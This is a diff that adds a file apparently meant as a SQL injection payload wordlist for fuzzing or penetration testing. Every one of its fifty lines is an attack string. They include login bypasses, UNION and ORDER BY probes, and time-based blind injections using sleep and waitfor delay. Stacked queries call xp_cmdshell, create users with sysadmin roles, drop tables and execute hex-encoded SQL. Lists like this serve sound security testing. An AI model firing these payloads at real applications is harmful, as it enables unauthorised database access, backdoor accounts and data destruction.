@@ -1,0 +1,50 @@
+' OR '1
+' OR 1 --
+' OR '' = '
+' = '
+' OR 'x'='x
+' AND id IS NULL; --
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+'
+' UNION SELECT sum(columnname ) from tablename --
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+' AND MID(VERSION(),1,1) = '5';"
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+' or sleep(5)#
+' or sleep(5)='
+' or benchmark(10000000,MD5(1))#"
+'; waitfor delay '0:0:5'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+' UNION ALL SELECT 1
+' UNION SELECT @@VERSION,SLEEP(5),3"
+' or true--
+admin' --
+admin' or '1'='1'--
+admin' or '1'='1
+admin' or 1=1#
+admin' or 1=1/*
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+' or 0=0 --
+' or username like '%
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; create user name identified by 'pass123' --
+' create user name identified by pass123 temporary tablespace temp default tablespace users;
+'; drop table temp --
+' exec sp_addlogin 'name' , 'password' --"
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --"
+' insert into user (user, host, password) values ('name', 'localhost', password('pass123')) --"
+' grant connect to name; grant resource to name; --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)"
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --"
+1' and 1=(select count(*) from tablenames); --
+' declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) 
+'; execute immediate 'sel' || 'ect us' || 'er'
+' HAVING 1=1
+' HAVING 1=0
+' HAVING 1=1#
